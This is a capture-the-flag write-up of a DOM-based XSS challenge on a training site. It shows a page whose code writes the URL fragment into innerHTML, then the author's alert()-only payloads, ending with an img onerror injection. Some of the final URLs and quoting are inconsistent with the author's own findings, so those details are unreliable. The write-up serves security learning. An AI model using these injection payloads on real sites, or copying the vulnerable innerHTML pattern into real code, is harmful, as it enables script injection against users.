```
<script src="hook.js"></script>
<script>
    window.addEventListener("load", function() {
        var q = location.hash.substring(1);
        window.query.innerHTML = q == '' ? `Hello!` : (`Hello, ${decodeURI(q)}`);
    });
</script>

<p id="query"></p>

<h1>inject</h1>
<p>Inspect the source code carefully and find where to inject :-)</p>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```
This is a DOM based XSS exploit. There are no obvious input fields on the page. First thing I tried was injecting into the URL like so ```https://xss.challenge.training.hacq.me/challenges/baby02.php=<script>javascript:alert('XSS');</script>```, but this only brought me to a 404 error. Next I tried ```https://xss.challenge.training.hacq.me/challenges/baby02.php?query=<script>javascript:alert('XSS');</script>```. This didn't bring me to a 404 page, but it didn't win me the level either.

Then I had a breakthrough. I tried ```https://xss.challenge.training.hacq.me/challenges/baby02.php#query=<script>javascript:alert('XSS');</script>```, which changed the 'Hello!' at the top of the page to ```'Hello, query=`' ```; however, it seems to filter out <script>.

I did some research on innerHTML XSS exploits, and decided that exploiting ```<img>``` tags and the onerror variable would be the way to go. Injected ```https://xss.challenge.training.hacq.me/challenges/baby02.php<img src=a onerror='alert('XSS');'>```, which didn't take (I've no idea why); however, ```https://xss.challenge.training.hacq.me/challenges/baby02.php<img src=a onerror='alert('doocument.domain');'>``` won.
